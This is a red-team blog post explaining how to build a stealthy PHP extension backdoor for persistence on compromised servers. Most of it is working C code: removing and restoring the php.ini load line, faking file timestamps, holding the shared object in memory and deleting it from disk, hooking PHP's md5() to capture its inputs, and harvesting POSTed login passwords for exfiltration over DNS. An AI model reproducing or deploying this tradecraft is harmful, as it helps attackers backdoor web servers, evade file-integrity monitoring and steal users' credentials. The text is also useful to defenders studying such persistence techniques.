---
layout: post
title: Improving PHP extensions as a persistence method
date: 2018-07-28 12:00:10
categories: posts
en: true
description: Article about how to build backdoors for the Zend Engine.
keywords: "Red Team, RedTeam, backdoor, PHP extension, Zend extension, pentest, hooking"
authors:
    - X-C3LL
---

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
In our operations as Red Team we tend to use different persistence methods because every technique has his pros and his contras. The choice usually is based on the context, so in the case of a server situated in the perimeter a PHP extension is a great election. I made a introductory post about this old technique in __Tarlogic's Blog__ ([Backdoors in XAMP stack (part I): PHP extensions](https://www.tarlogic.com/en/blog/backdoors-php-extensions/)). I recommend you to read first that post as a intro, because here we will not talk about basic topics like how to create and compile the extensions.


&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
The takeaways from this article are:
- How to reduce the tracks
- Hooking PHP functions to extract useful info from a Red Team perspective
- Interception of GET/POST parameters 


_PS: the examples are tested in a PHP 7 environment (there are changes between PHP 5 and PHP 7 API internals)_
## 0x00 Introduction
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
As a fast recap (in a classic XAMP stack):
1. PHP interpreter will load our PHP extension at startup if it is added in his php.ini file (extension=path/to/our/extension)
2. In a PHP extension we are interested mainly in 4 _hooks_: MINIT & MSHUTDOWN, and RINIT & RSHUTDOWN. The M* are executed (usually) as root when the interpreter starts and stops. The R* are executed in every request as the server user.
3. We can read HTTP headers from a request and trigger any action (for example to execute a command or initiate a reverse shell).



&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
To keep our acces to a compromised server a PHP extension is a really nice choice. We can interact with this kind of backdoors using a legitimate HTTP request (as seen in the recommended article), so firewalls and network rules can not detect us. Unfortunally, to load our extension we need to modify the php.ini file and reload gracefully the configuration. If the php.ini is not restored, the size, hash and timestamp will differ and the operation can be disclosed. Blue Team wins, we lose.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Of course the php.ini modifications should be detected inmediately by a file integrity checker... but in the reality SOCs tends to ignore this kind of alerts because usually are just noise made by an update or a sysadmin touching his systems.

## 0x01 This php.ini was not modified
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Ok, an alert was generated when we modified the php.ini. Someone SSHs to the server, does a cat to the php.ini and do not see nothing. Does a ls, and the timestamp is fine. The server is restarted gracefully just to double-check that nothing weird happens. __Our backdoor still alive__. What is happening here?

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
When our PHP extension is loaded, we no need to keep the line "extesion=path/to/our.so" inside the php.ini file. We can retrieve it to his original status programatically. Taking advantage of the __MINIT__ hook we can delete the line added to the php.ini, so when the extension is loaded this hook will be triggered as root (usually) and we can edit the php.ini file without problems. 

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
In the same way, we can use __MSHUTDOWN__ to insert a snippet of code destinated to add again the line to the php.ini, so when the server is restarted the line "extension=..." will be added again. The extension will be loaded, the MINIT is executed and the cicle is closed. Using this approach the php.ini file will not show anything weird the most part of the time. A generic function can be expressed like this:


```c
// This code sucks
int modifyExtension(int action) {
    char *source = NULL;
    char *needle = NULL;
    FILE *fp;
    size_t newSize;

    fp = fopen(PHPINI, "a+");
    if (fp != NULL) {
        if (action == 1) {
            if (fseek(fp, 0L, SEEK_END) == 0) {
                long bufsize = ftell(fp); // FileSize
                if (bufsize == -1) {
                    return -1;
                }
                source = malloc(sizeof(char *) * (bufsize + 1)); // Alloc memory to read php.ini
                if (fseek(fp, 0L, SEEK_SET) != 0) {
                    return -1;
                    free(source);
                }
                newSize = fread(source, sizeof(char), bufsize, fp);
                if (ferror(fp) != 0) {
                    return -1;
                    free(source);
                }           
                else {
                    source[newSize++] = '\0';
                    needle = strstr(source, LOCATION);
                    if (needle != 0) {
                        FILE *tmp = fopen("/tmp/.tmpini", "w");
                        fwrite(source, (needle - source - 11), 1, tmp); //11 = len("\nextension=kk.so")
                        fclose(tmp);
                        rename("/tmp/.tmpini", PHPINI);
                    }
                }
                free(source);
            }
            fclose(fp);
        }
        if (action == 0) {
            fwrite("\nextension=", 11, 1, fp);
            fwrite(LOCATION, strlen(LOCATION), 1, fp);
            fclose(fp);
            fprintf(stderr, "[+] Extension added to PHP.INI\n");
        }
    }
    else {
        return -1;
    }
    return 1;
}
```

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
The counterpart of this tactic is that if the server is killed in an unexpected way, the MSHUTDOWN hook will not be executed. In the other hand, the timestamp will be modified, so we need to keep that in mind too:

```c
#define PHPINI "/u/know/that/php.ini"
...
struct stat st;
stat(PHPINI, &st);
...// Do changes
new_time.actime = st.st_atime;
new_time.modtime = st.st_mtime;
utime(PHPINI, &new_time);
```
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Restoring the timestamp is always a cool trick. 

## 0x02 Bring me from memory
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
We saw how to restore the php.ini, but we need to delete and restore the backdoor itself (the shared object) because we are working at userland level (if we use a rootkit -a simple LKM for example- we can hide it without problems). At the moment that our extension is loaded, we can save its content in memory easily, then delete the file. Something like:

```c
//Simple PoC
PHP_MINIT_FUNCTION(PoC)
{
    //Executed when the module is loaded
    // Privilege: root (usually)

    int fd, check;
    struct utimbuf new_time;

    fprintf(stderr, "[+] LOADED\n");
    //1) Calculate size of the file
    struct stat st;
    if (stat(LOCATION, &st) == -1) {
        return SUCCESS;
    }
    filesize = st.st_size;

    //2) Open the file 
    fd = open(LOCATION, O_RDONLY, 0);
    if (fd == -1) {
        return SUCCESS;
    }

    //3) Map file to memory
    mapedFile = mmap(NULL, filesize, PROT_READ, MAP_PRIVATE, fd, 0);
    close(fd);
    
    //4) Delete file
    remove(LOCATION);
    
    //5) Get timestamp
    stat(PHPINI, &st);

    //6) Modify php.ini and delete the extension line
    check = modifyExtension(1);
    if (check == -1) {
        fprintf(stderr, "[+] PHP.INI could not be edited\n");
    }
    else {
        fprintf(stderr, "[+] PHP.INI edited\n");
    }

    //7) Fake timestamp
    new_time.actime = st.st_atime;
    new_time.modtime = st.st_mtime;
    utime(PHPINI, &new_time);
...
```

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
The next step is to use the MSHUTDOWN hook to write the shared object from memory to a file:
```c
PHP_MSHUTDOWN_FUNCTION(Allocer)
{
    // We write the file again, edit php.ini and fake the timestamp
    if (mapedFile == MAP_FAILED) {
        return SUCCESS;
    }
    
    int check;
    FILE *fp;
    struct utimbuf new_time;
    struct stat st;

    fp = fopen(LOCATION, "w");
    fwrite(mapedFile, 1, filesize, fp);
    fclose(fp);
    munmap(mapedFile, filesize);
    stat(PHPINI, &st);
    new_time.actime = st.st_atime;
    new_time.modtime = st.st_mtime;    
    
    check = modifyExtension(0);

    utime(PHPINI, &new_time);
    return SUCCESS;
}
```

## 0x03 Hooked on a feeling

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
We know now how to leave the minimum tracks and in my post at Tarlogic's blog was explained how to communicate with our backdoor and trigger actions via HTTP headers, so lets move to more interesting things like hooking.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
As ReadTeamers we are eager for hunting credentials that help us in the lateral movement. If we can place a hook in well-known functions (like the ones used to hash passwords or the used to insert new users in the database) we can retrieve critical info that can be exfiltrated vía DNS (as shown in this post "[Exfiltrating credentials via PAM backdoors & DNS requests](https://x-c3ll.github.io/posts/PAM-backdoor-DNS/)"). As a simple PoC, we are going to hook the PHP function md5(). Lets dive deep inside PHP internals!

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
The function symbol table is stored as  a [HashTable](http://www.phpinternalsbook.com/hashtables.html) inside the structure [zend_compiler_globals](https://phpinternals.net/docs/zend_compiler_globals):

```c
struct _zend_compiler_globals {
    zend_stack loop_var_stack;

    zend_class_entry *active_class_entry;

    zend_string *compiled_filename;

    int zend_lineno;

    zend_op_array *active_op_array;

    HashTable *function_table;  /* function symbol table */
...
```
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
We can access to the function_table member vía the CG (_Compiler Global_) macro and search for the address of a function. As it is a HashTable, we can use [zend_hash_str_find_ptr](https://phpinternals.net/docs/zend_hash_str_find_ptr) to search for the key "md5". Lastly, we only need to modify the handler (that points to the address of the function) to make it point to our hook. Something like this:

```c
//Placed at MINIT
	...
    zend_function *orig;
    orig = zend_hash_str_find_ptr(CG(function_table), "md5", strlen("md5"));
    orig->internal_function.handler = zif_md5_hook;
    ...
```
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Check the original [md5 function code](https://github.com/php/php-src/blob/master/ext/standard/md5.c):

```c
PHP_NAMED_FUNCTION(php_if_md5)
{
	zend_string *arg;
	zend_bool raw_output = 0;
	PHP_MD5_CTX context;
	unsigned char digest[16];

	ZEND_PARSE_PARAMETERS_START(1, 2)
		Z_PARAM_STR(arg)
		Z_PARAM_OPTIONAL
		Z_PARAM_BOOL(raw_output)
ZEND_PARSE_PARAMETERS_END();
...

```
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
To create our hook first we need to define it with the correct data type and args. In the offical [documentation](http://php.net/manual/es/internals2.funcs.php) appears that PHP_NAMED_FUNCTION(whatever) expands to `void zif_whatever(INTERNAL_FUNCTION_PARAMETERS)`. So our hook must be created like this:

```c
// Test Hook md5
void zif_md5_hook(INTERNAL_FUNCTION_PARAMETERS) {
    php_printf("[+] Hook called\n");
    zend_string *arg;
    zend_bool raw_output = 0;
    ZEND_PARSE_PARAMETERS_START(1, 2)
        Z_PARAM_STR(arg)
        Z_PARAM_OPTIONAL
        Z_PARAM_BOOL(raw_output)
	ZEND_PARSE_PARAMETERS_END();
    php_printf("[+] MD5 Called with parameter: %s", ZSTR_VAL(arg));
}
```
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Compile and execute:

```
mothra@arcadia:~/php-7.2.8/ext/Allocer| 
⇒  sudo /usr/local/bin/php  -r "echo md5('kk');"
[+] LOADED
[+] PHP.INI edited
[+] Hook called
[+] MD5 Called with parameter: kk%
```
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Perfect! The way to call the original md5 after our arbitrary code is executed is left as an exercise to the reader. It is easy to do, as we have the reference to the original address before we modified it __:P__

## 0x04 Sniffing parameteres (GET/POST)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Hooking juicy functions is a nice way to retrieve info, but if we know the existence of cool parameters sent via POST or GET (for example the login form) is far better to hunt those values. We are going to place our code inside the __RINIT__ hook because it is executed every time a request is processed. In order to retrieve the information we need to check how PHP engine does it at [php_variables.c](https://github.com/php/php-src/blob/master/main/php_variables.c):

```c
...
zval_ptr_dtor_nogc(&PG(http_globals)[TRACK_VARS_POST]);
ZVAL_COPY_VALUE(&PG(http_globals)[TRACK_VARS_POST], &array);
...
```
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
So the variables are taken as an array from http_globals. The easiest way to search for a particular value (for example we want to exfiltrate the "pass" parameter sent in a login form) is to fetch a HashTable from the array and then use the API to search as we did before to search for the md5 function. Our magic function to do this is [HASH_OF](https://phpinternals.net/docs/hash_of):

```c
	zval *password;
	zval *post_arr;
	HashTable *post_hash;
	post_arr = &PG(http_globals)[TRACK_VARS_POST]; //Array
	post_hash = HASH_OF(post_arr);

	password = zend_hash_str_find(post_hash, "pass", strlen("pass"));
	if (password != 0) {
		php_printf("Password: %s", Z_STRVAL_P(password));
	}

```
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
If we test it:

```
mothra@arcadia:~/php-7.2.8/ext/Allocer| 
⇒  curl localhost:8888/k.php --data "pass=s0S3cur3"
Password: s0S3cur3
```
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Now this password can be saved inside a file or just sent to us via DNS to an authoritative DNS server owned by us.

## 0x05 Final words
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
PHP extensions is a powerful way to keep a persistence inside a compromised target, and of course, is the best excuse to start playing with PHP internals.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
If you find useful this article, or wanna point me to an error or a typo, feel free to contact me at twitter [@TheXC3LL](https://twitter.com/thexc3ll).

